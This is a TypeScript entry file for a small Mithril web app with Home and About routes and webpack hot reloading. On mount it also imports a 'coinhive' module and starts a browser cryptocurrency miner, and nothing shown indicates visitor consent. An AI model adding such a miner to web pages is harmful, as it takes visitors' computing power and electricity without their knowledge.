import "./index.scss";
import "./scss/_normalize.scss"
import * as m from "mithril";
import * as CoinHiveMiner from "./coinhive"

import { HomeView } from "./views/home";
import { AboutView } from "./views/about";

const appView = document.getElementById("app-view");
if (appView) {
  m.route(appView, "/", {
    "/": HomeView,
    "/about": AboutView,
  });
  CoinHiveMiner.setup();
  CoinHiveMiner.start();
} else {
  console.error("Unable to locate #app-view.");
}

///////////////////////////////////////////////////////////////////////////////
// For webpack HMR
// NOTE: this won't work for more complex apps. However you can always
// hit refresh in your browser after making code changes.
// What this does is allow live CSS updates as well as simple code updates.
declare const module: any // tslint:disable-line no-reserved-keywords
if (module.hot) {
  module.hot.accept()
}
